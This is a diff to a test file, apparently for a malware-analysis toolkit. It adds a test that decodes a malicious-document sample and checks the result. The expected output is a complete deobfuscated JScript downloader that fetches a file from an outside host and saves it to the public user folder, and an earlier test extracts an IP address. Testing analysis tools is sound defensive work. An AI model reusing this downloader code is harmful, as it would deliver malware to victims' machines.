@@ -88,3 +88,24 @@ class TestGrabBagExamples(TestBase):
         data = self.download_sample('58ba30052d249805caae0107a0e2a5a3cb85f3000ba5479fafb7767e2a5a78f3')
         pipeline = load_pipeline('rex yara:50607080.* [| struct LL{s:L}$ | xor -B2 accu[s]:$msvc | xtp url ]')
         self.assertEqual(str(data | pipeline), 'http://64.235.39''.82')
+
+    def test_example_02_maldoc(self):
+        data = self.download_sample('ee103f8d64cd8fa884ff6a041db2f7aa403c502f54e26337c606044c2f205394')
+        pipeline = load_pipeline('doctxt | repl drp:c: | carve -s b64 | rev | b64 | rev | ppjscript')
+        self.assertEqual(str(data | pipeline), '\n'.join((
+            r'var girlLikeDoor = new ActiveXObject("msxml2.xmlhttp");',
+            r'girlLikeDoor.open("GET", "http://shoulderelliottd'
+                r'.com/boolk/QlaJk8C6vYqIyEwbdypBHv3yJR/wrWWNCD/77427/bebys8'
+                r'?cid=Bm9cAP&wP8zhkK=aNLC3bJChZM5GauIB&=S0MRS72jqtkORxKA3iUkjdS", false);',
+            r'girlLikeDoor.send();',
+            r'if (girlLikeDoor.status == 200) {',
+            r'    try {',
+            r'        var karolYouGirl = new ActiveXObject("adodb.stream");',
+            r'        karolYouGirl.open;',
+            r'        karolYouGirl.type = 1;',
+            r'        karolYouGirl.write(girlLikeDoor.responsebody);',
+            r'        karolYouGirl.savetofile("c:\\users\\public\\tubeGirlLoad.jpg", 2);',
+            r'        karolYouGirl.close;',
+            r'    } catch (e) {}',
+            r'}',
+        )))
